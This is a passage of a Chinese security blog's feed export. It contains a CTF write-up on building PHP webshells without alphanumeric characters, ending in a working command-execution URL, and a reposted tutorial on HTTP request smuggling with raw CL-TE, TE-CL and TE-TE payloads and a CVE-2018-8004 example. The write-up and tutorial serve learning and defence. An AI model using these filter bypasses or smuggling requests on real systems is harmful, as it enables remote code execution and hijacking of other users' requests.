class="hljs-variable">$_</span>; <span class="hljs-comment">// A</span></code></pre></div><p>怎么使数组Array这个类型名变成字符串呢，这里可以利用[ ] 与Array进行字符串连接，即可得到string，也可以直接用双引号</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = [];var_dump( <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$a</span>); <span class="hljs-comment">//string(5) &quot;Array&quot;</span><span class="hljs-variable">$a</span> = [];var_dump( <span class="hljs-string">&quot;<span class="hljs-subst">$a</span>&quot;</span>); <span class="hljs-comment">//string(5) &quot;Array&quot;</span></code></pre></div><p>通过自增可以从’a’获取到’z’,从’A’获取到’Z’，而从Array这个字符里可以获取到大小写的a，构造起来就比较简单了。</p></li></ol><h3 id="二、无字母数字下划线的webshell构造"><a href="#二、无字母数字下划线的webshell构造" class="headerlink" title="二、无字母数字下划线的webshell构造"></a>二、无字母数字下划线的webshell构造</h3><ol><li><p>php中{}的作用：</p><p>在数组中的效果差不多，就是索引</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;abc&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>&#123;<span class="hljs-number">1</span>&#125;;<span class="hljs-comment">//b</span></code></pre></div><p>使用索引数组的时候，利用{}可以将被包围的内容当做变量来处理</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;abc&#x27;</span>=&gt;<span class="hljs-string">&#x27;vvvv&#x27;</span>,<span class="hljs-string">&#x27;cba&#x27;</span>=&gt;<span class="hljs-string">&#x27;sss&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$a[&#x27;abc&#x27;]&#125;</span>&quot;</span>;<span class="hljs-comment">//vvvv</span><span class="hljs-comment">//这样就不行，会报语法错误</span><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;abc&#x27;</span>=&gt;<span class="hljs-string">&#x27;vvvv&#x27;</span>,<span class="hljs-string">&#x27;cba&#x27;</span>=&gt;<span class="hljs-string">&#x27;sss&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span>[&#x27;abc&#x27;]&quot;</span>;<span class="hljs-comment">//如果只是单纯的数组的话，不加是没问题的</span><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;abc&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span>[1]&quot;</span>;<span class="hljs-comment">//b</span><span class="hljs-variable">$a</span> = [<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>];<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span>[1]&quot;</span>;<span class="hljs-comment">//b</span></code></pre></div></li><li><p>php中${ }的作用</p><ol><li><p>动态访问变量</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a1</span>=<span class="hljs-string">&#x27;111&#x27;</span>;<span class="hljs-variable">$a2</span>=<span class="hljs-string">&#x27;222&#x27;</span>;<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">2</span>;<span class="hljs-variable">$i</span>++)&#123;    <span class="hljs-keyword">echo</span> $&#123;<span class="hljs-string">&quot;a&quot;</span>.<span class="hljs-variable">$i</span>&#125;.<span class="hljs-string">&quot;\n&quot;</span>;&#125;<span class="hljs-comment">//111</span><span class="hljs-comment">//222</span></code></pre></div><p>就相当于${ }里面构造出变量的字符串，然后这个写法就可以访问变量或者函数了。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;$&#123;<span class="hljs-string">&#x27;a&#x27;</span>&#125;();<span class="hljs-comment">//这样就可以调用phpinfo函数</span></code></pre></div></li></ol></li><li><p>php5和php7中变量表达式的结合顺序</p><table><thead><tr><th>示例代码</th><th>PHP7结合方向</th><th>PHP5结合方向</th></tr></thead><tbody><tr><td><code>$$foo\[&#39;bar&#39;][&#39;baz&#39;]</code></td><td><code>&#123;$$foo&#125;\[&#39;bar&#39;][&#39;baz&#39;]</code></td><td><code>$&#123;$foo\[&#39;bar&#39;][&#39;baz&#39;]&#125;</code></td></tr><tr><td><code>$foo-&gt;$bar[&#39;baz&#39;]</code></td><td><code>&#123;$foo-&gt;$bar&#125;[&#39;baz&#39;]</code></td><td><code>$foo-&gt;&#123;$bar[&#39;baz&#39;]&#125;</code></td></tr><tr><td><code>$foo-&gt;$bar[&#39;baz&#39;]() </code></td><td><code>&#123;$foo-&gt;$bar&#125;[&#39;baz&#39;]()</code></td><td><code>$foo-&gt;&#123;&#123;$bar[&#39;baz&#39;]&#125;()&#125;;</code></td></tr><tr><td><code>foo::$bar\[&#39;baz&#39;]()</code></td><td><code>&#123;foo::$bar&#125;\[&#39;baz&#39;]()</code></td><td><code>foo::&#123;&#123;$bar[&#39;baz&#39;]&#125;()&#125; </code></td></tr></tbody></table><p>这里我自己也进行了一些测试，先使用php5进行测试</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$foo</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;bar&#x27;</span>=&gt; <span class="hljs-string">&#x27;mm&#x27;</span>);<span class="hljs-variable">$mm</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;baz&#x27;</span>=&gt; <span class="hljs-string">&#x27;nn&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>[<span class="hljs-string">&#x27;bar&#x27;</span>][<span class="hljs-string">&#x27;baz&#x27;</span>],<span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-comment">//m 为什么输出m,按照php5表达式的结合顺序，先访问到mm，然后对mm进行索引，因为索引不存在，对&#x27;baz&#x27;进行类型转换成0，所以就访问到了m，所以php5结合的特性的确有点另类。</span><span class="hljs-keyword">echo</span> $&#123;<span class="hljs-variable">$foo</span>[<span class="hljs-string">&#x27;bar&#x27;</span>]&#125;[<span class="hljs-string">&#x27;baz&#x27;</span>];<span class="hljs-comment">//nn，使用$&#123;&#125;就能够控制顺序了</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mm</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$baz</span>=<span class="hljs-string">&quot;aaa&quot;</span>;&#125;<span class="hljs-variable">$foo</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;bar&#x27;</span>=&gt; <span class="hljs-string">&#x27;baz&#x27;</span>);<span class="hljs-variable">$mm</span>= <span class="hljs-keyword">new</span> mm();<span class="hljs-keyword">echo</span> <span class="hljs-variable">$mm</span>-&gt;<span class="hljs-variable">$foo</span>[<span class="hljs-string">&#x27;bar&#x27;</span>],<span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-comment">//这里输出aaa,很容易理解，但是在php7中，按照访问顺序，要先结合$mm-&gt;$foo，测试如下</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mm</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$baz</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;baz&#x27;</span>=&gt;<span class="hljs-string">&quot;aaa&quot;</span>);&#125;<span class="hljs-variable">$mm</span>= <span class="hljs-keyword">new</span> mm();<span class="hljs-variable">$foo</span> = <span class="hljs-string">&#x27;baz&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$mm</span>-&gt;<span class="hljs-variable">$foo</span>[<span class="hljs-string">&#x27;baz&#x27;</span>],<span class="hljs-string">&quot;\n&quot;</span>;<span class="hljs-comment">//aaa</span></code></pre></div><p>总结一下就是：php7的结合顺序为从左到右，php5的结合方式为从里到外。</p></li><li><p>php中的函数动态执行</p><p>php7中支持对使用（$a）()这样的方式执行动态函数</p><p>我这里进行了测试，php7中差不多有这么几种方式执行动态函数：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;$&#123;a&#125;();<span class="hljs-comment">//这个是可以的</span>$&#123;<span class="hljs-string">&#x27;phpinfo&#x27;</span>&#125;();<span class="hljs-comment">//这个不行</span><span class="hljs-variable">$a</span>();<span class="hljs-comment">//这个可以</span>(<span class="hljs-variable">$a</span>)()<span class="hljs-comment">//这个也可以</span></code></pre></div><p>换成php5后：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;(<span class="hljs-variable">$a</span>)();<span class="hljs-comment">//这个在php5中不支持</span><span class="hljs-comment">//其他的基本一致</span></code></pre></div><p>也就是说，在php7中只要在()中构造出对应的php函数的名字就行，类型为字符串。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;(<span class="hljs-string">&#x27;phpinfo&#x27;</span>)();(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<span class="hljs-comment">//phpinfo，这里暂时用url编码表示，如果不使用浏览器传参的话，需要自己手动解码一下:</span>(~urldecode(<span class="hljs-string">&quot;%8F%97%8F%96%91%99%90&quot;</span>))(); <span class="hljs-comment">//phpinfo</span><span class="hljs-comment">//怎么构造，反过来就ok：echo urlencode(~&#x27;p&#x27;);</span></code></pre></div></li><li><p>php5 webshell构造</p><ol><li><p>可以用异或来构造</p></li><li><p>linux shell的特点和通配符正则的利用</p><ol><li><p>shell下可以利用<code>.</code>来执行任意脚本</p></li><li><p>可以用到Linux下的glob通配符：</p><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul><p>总体上来说，可以先对php页面上传一个马，这时候这个马会保存在临时文件夹下，不知道文件名，但是可以使用linux bash的通配符在ls中获取到，如果能够单独获取到这个文件后，再利用shell下可以直接使用 . 来越权执行文件，就可以获取到shell。</p></li></ol></li><li><p>关键在于怎么获取到这个写有马的临时文件。</p></li><li><p>使用？通配符和正则匹配进行过滤，这里贴出原文payload的就差不多了。</p><div class="hljs code-wrapper"><pre><code class="hljs ruby">ls /<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">?[</span>^-][^.][^.]<span class="hljs-string">?[</span>^.]?</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs bash">ls /???/????????[@-[]</code></pre></div></li></ol></li></ol><hr><h1 id="0x03-回到love-math的构造"><a href="#0x03-回到love-math的构造" class="headerlink" title="0x03 回到love math的构造"></a>0x03 回到love math的构造</h1><p>参考资料：<a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></p><p>常规思路是构造一个<code>$GET_[**]</code>但是[ ] 被过滤了，但是可以利用$_GET{‘a’};可以构造出大写字母，但是如果只通过取反或者自增的话，肯定会超字数。</p><p>需要注意的是：</p><ol><li><p><code>$_GET[&#39;a&#39;] </code>可以使用 <code>$_GET&#123;&#39;a&#39;&#125;</code>代替</p></li><li><p>在浏览器中使用GET进行传参的时候，GET获取的参数不需要加引号，因为浏览器获取的本身就是字符形式。这里的pi和abs都不需要引号。</p><div class="hljs code-wrapper"><pre><code class="hljs gams">(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;) =&gt; (<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built_in">pi</span>&#125;(<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built_in">abs</span>&#125;</code></pre></div></li></ol><p>这里学到使用进制变换来构造字符串绕过对字符的限制， 但是这里至少要保证数字是可以是可以使用的。</p><p>几个关键性的函数：</p><ol><li>base_convert,可以在任意进制间切换</li><li>bin2hex将二进制字符转换为16进制字符</li><li>hex2bin将16进制字符转换为2进制。</li><li>dechex，将10进制变为16进制</li><li>hexdec，将16进制变为10进制。</li></ol><p>白名单里没有bin2hex，但是可以使用base_convert进行构造</p><p>注意：</p><ol><li><p>为什么需要构造bin2hex：一个是白名单里没有，另外一个原因是base_convert没有办法获取到_和大写字母，但是bin2hex可以，使用bin2hex得到_GET就好办多了</p></li><li><p>需要利用到php7的括号动态执行函数，这里可以通过phpinfo看到php的版本</p></li><li><p>注意GET的传参</p></li><li><p>为什么使用$pi，因为pi刚好在白名单里，这样命名的变量可以绕过。别的函数的名字充当变量名一样可以，这里只是取了一个最短的。</p></li><li><div class="hljs code-wrapper"><pre><code>http://a6a148ea-6a32-41a8-b73a-81eb9b247f3f.node3.buuoj.cn/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));(($$pi)&#123;1&#125;)($$pi&#123;2&#125;)&amp;1=system&amp;2=cat%20/flag</code></pre></div></li></ol><h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h1><ul><li><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></li><li><a href="https://www.freebuf.com/articles/web/186298.html">https://www.freebuf.com/articles/web/186298.html</a> </li><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a> </li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>webshell</category>
      
      <category>ctf</category>
      
      <category>CISCN 2019初赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>ctf</tag>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【转载】协议层的攻击——HTTP请求走私</title>
    <link href="/2019/10/19/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E5%8D%8F%E8%AE%AE%E5%B1%82%E7%9A%84%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <url>/2019/10/19/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E5%8D%8F%E8%AE%AE%E5%B1%82%E7%9A%84%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-HTTP走私攻击学习"><a href="#0x01-HTTP走私攻击学习" class="headerlink" title="0x01 HTTP走私攻击学习"></a>0x01 HTTP走私攻击学习</h2><p>参考网址：<a href="https://paper.seebug.org/1048/#31-cl0get">https://paper.seebug.org/1048/#31-cl0get</a> 协议层的攻击——HTTP请求走私</p><h3 id="一、产生原因"><a href="#一、产生原因" class="headerlink" title="一、产生原因"></a>一、产生原因</h3><p>为了使得用户在访问服务器资源能够获得更好的访问体验，加快用户访问资源的速度，通常在用户和服务器之间放置一台缓存服务器来进行资源的缓存。拓扑图如下：<br><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1571366802717.png" alt="1571366802717"></p><h4 id="Pipeline："><a href="#Pipeline：" class="headerlink" title="Pipeline："></a>Pipeline：</h4><p>Pipeline是对keep-alive的一个延伸，keep-alive要求不终止TCP连接，而Pipeline允许客户端采用流水线的方式发送报文而不用等待服务端相应，发送过去的报文在服务端进行对应，这进一步提升了访问速度。</p><h4 id="问题所在："><a href="#问题所在：" class="headerlink" title="问题所在："></a>问题所在：</h4><p>如果两台服务器对于报文的处理方式有差异，恶意攻击者可以对报文进行混淆，使得第一台服务器认为是正常的HTTP请求，而第二台服务器只认可报文中的一部分，另外一部分的报文就算是走私的请求。</p><h4 id="不严格遵守RFC标准"><a href="#不严格遵守RFC标准" class="headerlink" title="不严格遵守RFC标准"></a>不严格遵守RFC标准</h4><p> Request For Comments（RFC），是一系列以编号排定的文件。文件收集了有关互联网相关信息，以及UNIX和互联网社区的<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053">软件</a>文件。目前RFC文件是由Internet Society（ISOC）赞助发行。基本的互联网通信协议都有在RFC文件内详细说明。RFC文件还额外加入许多在标准内的论题，例如对于互联网新开发的协议及发展中所有的记录。因此几乎所有的互联网标准都有收录在RFC文件之中。 </p><p>RFC标准中规定了如何处理可以防止此漏洞，但是不严格遵守这些标准的服务器就会出现这种问题</p><h3 id="二、CL不为0的情况"><a href="#二、CL不为0的情况" class="headerlink" title="二、CL不为0的情况"></a>二、CL不为0的情况</h3><p>CL不为0的请求可能影响到所有不携带请求体的报文</p><p>示例如下：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 44<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div><p>不仅仅是GET请求，如果前端服务器允许GET请求携带请求体，读取到Content-Length后将下面的部分当做请求的内容。而后端服务器不允许GET请求携带请求体，就不会处理Content-Length这个字段，所以后面的内容就被当做了另外一个GET请求来处理，</p><p>如果前端服务器做了waf只对get参数进行过滤，而后端服务器没有waf的话，通过这样的走私，完全可以将前端的waf绕过。(这里还有待修改，不一定正确)</p><h3 id="三、CL-CL"><a href="#三、CL-CL" class="headerlink" title="三、CL-CL"></a>三、CL-CL</h3><p>所谓CL-CL就是含有两个Content-Length字段，前端服务器处理第一个字段后，发送给后端服务器就只剩下了第二个Content-Length，如果这两个字段的值不一样的话，后端服务器会忽略掉请求体中的部分内容，由于PipeLine机制的存在，被忽略的内容会连接上下一个报文，从而影响到下一个报文的内容。</p><p>示例如下：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 7<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>12345<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>a</code></pre></div><p>第一个服务器处理了Content-Length=8，正好将所有的请求体都当做了该报文的一部分， 进而发送给第二个服务器，这时候报文中只有第二个Content-Length=7，后端服务器在处理的时候只读取到了<code>12345\r\n</code>,剩余的a没有被读取到，由于存在PipeLine机制，a被拼接到了下一个报文，造成下一个报文出错。如果精心构造，可以构造出一个新的报文。至于怎么绕过waf的，还不太明白，后面学会了后再上来补充</p><h3 id="四、CL-TE"><a href="#四、CL-TE" class="headerlink" title="四、CL-TE"></a>四、CL-TE</h3><p>先来了解一下HTTP中的Transfer-Encoding字段：</p><p>参考链接：<a href="https://www.jianshu.com/p/da01a20a515e">https://www.jianshu.com/p/da01a20a515e</a> 关于HTTP1.1的Transfer-Encoding:chunked</p><p>Transfer-Encoding是HTTP头中的一个字段，字面意思是传输编码，现在的http中，传输编码只规定了一种格式：Trunk，也就是分块编码</p><p>分块编码的机制是，传输的数据分为一系列数据块，并且以一个或者多个发送，这样服务器就可以不预先知道发送内容的总大小，每个分块包含十六进制的长度和数据，长度独占一行，长度不包括它结尾的CRLF，也不包括数据后面的CRLF，最后一个分块的长度值必须为0，表示对应分块没有数据，实体结束</p><p>Trunk的传输形式如下：</p><div class="hljs code-wrapper"><pre><code class="hljs trunk">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</code></pre></div><p>（注意实际发送trunk的时候不需要[ ])</p><h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE:"></a>CL-TE:</h4><p>指的是前端服务器只处理Content-Length字段，而后端服务器忽略Content-Length字段，处理Transfer-Encodiing</p><p>构造数据包</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Accept-Language: en-US,en;q=0.5<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Connection: keep-alive<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 6<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>G</code></pre></div><p>前端服务器接收到请求后，处理Content-Length字段</p><p>0\r\n<br>\r\n<br>G</p><p>刚好长度为6，而后端服务器读取Transfer-Encoding，读取到</p><p>0\r\n<br>\r\n</p><p>后认为分段报文读取完毕了，G留在了缓冲区中，连接到了下一个报文，使得下一个报文出错</p><h3 id="五、TE-CL"><a href="#五、TE-CL" class="headerlink" title="五、TE-CL"></a>五、TE-CL</h3><p>指的是前端服务器处理Transfer-Encoding字段，而后端服务器处理Content-Length字段。</p><p>构造数据包：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Accept-Language: en-US,en;q=0.5<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div><p>原文的解释是，前端服务器处理Transfer-Encoding，读取到结尾处正好12个字符(暂时不明白为什么只有12个字符)，把它当做完整的报文发送给后端的服务器，后端的服务器解析Content-Length，读取到<code>12\r\n</code>就结束了，后面的被解析成另一个报文，所以产生错误</p><h3 id="六、TE-TE"><a href="#六、TE-TE" class="headerlink" title="六、TE-TE"></a>六、TE-TE</h3><p>前后端都处理Transfer-Encoding，但是我们可以通过混淆使得其中一台服务器不处理Transfer-Encoding，转而处理Content-Length</p><p>构造数据包：</p><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Accept-Language: en-US,en;q=0.5<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Transfer-encoding: cow<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>GPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></code></pre></div><h2 id="0x02-CVE-2018-8004-http走私攻击实例分析"><a href="#0x02-CVE-2018-8004-http走私攻击实例分析" class="headerlink" title="0x02 CVE-2018-8004 http走私攻击实例分析"></a>0x02 CVE-2018-8004 http走私攻击实例分析</h2><h3 id="一、可利用点1：冒号问题"><a href="#一、可利用点1：冒号问题" class="headerlink" title="一、可利用点1：冒号问题"></a>一、可利用点1：冒号问题</h3><h4 id="当ATS服务器接收到的请求中存在请求字段与-之间存在空格的字段时，并不会对其进行修改，也不会按照RFC标准所描述的那样返回400错误，而是直接将其转发给后端服务器。"><a href="#当ATS服务器接收到的请求中存在请求字段与-之间存在空格的字段时，并不会对其进行修改，也不会按照RFC标准所描述的那样返回400错误，而是直接将其转发给后端服务器。" class="headerlink" title="当ATS服务器接收到的请求中存在请求字段与:之间存在空格的字段时，并不会对其进行修改，也不会按照RFC标准所描述的那样返回400错误，而是直接将其转发给后端服务器。"></a>当ATS服务器接收到的请求中存在请求字段与<code>:</code>之间存在空格的字段时，并不会对其进行修改，也不会按照RFC标准所描述的那样返回<code>400</code>错误，而是直接将其转发给后端服务器。</h4><p>如果后端为nginx服务器，nginx服务器在处理字段与冒号前有空格时，不会反回400，而是忽略该字段，如果我们将Content-Length字段与冒号中间加一个空格使得后端服务器不解析请求体，请求体留在缓冲区中，这就造成了走私，进一步构造，使得后面的报文直接连接上这部分内容，劫持后面的报文。</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: lnmp.mengsec.com<span class="hljs-attribute">Content</span>-Length : <span class="hljs-number">56</span><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: lnmp.mengsec.com<span class="hljs-attribute">attack</span>: <span class="hljs-number">1</span><span class="hljs-attribute">foo</span>:</code></pre></div><p>（注意：foo:后面没有\n\r，也就是说如果这段内容存在于缓冲区中的话，会和后面的报文连接）</p><p>Content-Length字段与冒号重甲加了一个空格，导致nginx不解析该字段，后面的请求体直接被当做了下一个报文</p><p>当下一个报文到达的时候拼接结果如下：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<span class="hljs-attribute">Host</span>: lnmp.mengsec.com\r\n<span class="hljs-attribute">attack</span>: <span class="hljs-number">1</span>\r\n<span class="hljs-attribute">foo</span>: GET / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<span class="hljs-attribute">Host</span>: <span class="hljs-number">10.211.55.2:10086</span>\r\n<span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">10.211.55.2</span>\r\n<span class="hljs-attribute">Via</span>: http/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> mengchen-ubuntu[<span class="hljs-number">3</span>ff<span class="hljs-number">3687</span>d-fa<span class="hljs-number">2</span>a-<span class="hljs-number">4198</span>-bc<span class="hljs-number">9</span>a-<span class="hljs-number">0</span>e<span class="hljs-number">98786</span>adc<span class="hljs-number">62</span>] (ApacheTrafficServer/<span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span 